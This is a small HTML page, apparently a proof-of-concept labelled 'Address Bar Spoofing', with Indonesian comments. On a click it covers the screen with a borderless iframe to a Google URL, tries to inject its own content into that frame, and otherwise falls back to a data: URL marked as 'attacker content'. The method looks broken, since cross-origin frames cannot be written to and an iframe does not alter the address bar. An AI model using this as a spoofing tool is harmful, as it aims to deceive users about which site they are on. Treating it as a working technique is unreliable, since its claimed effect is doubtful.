<!DOCTYPE html>
<html>
<body>
<button onclick="a()">Click me</button>

<script>
function a() {
  // Pakai iframe bukan window.open
  const iframe = document.createElement('iframe');
  iframe.style.cssText = `
    position:fixed;inset:0;
    width:100%;height:100%;
    border:none;z-index:9999;
  `;
  
  // Set src ke google.com/csi
  iframe.src = "https://www.google.com/csi";
  document.body.appendChild(iframe);

  // Inject ke iframe
  setTimeout(() => {
    try {
      iframe.contentDocument.write(`
        <h1 style="color:white;background:black;
                   padding:40vh 20px;text-align:center;">
          Address Bar Spoofing
        </h1>
      `);
    } catch(e) {
      // Ganti src iframe ke attacker content
      iframe.src = "data:text/html,<h1>Spoofed!</h1>";
    }
  }, 100);
}
</script>
</body>
</html>
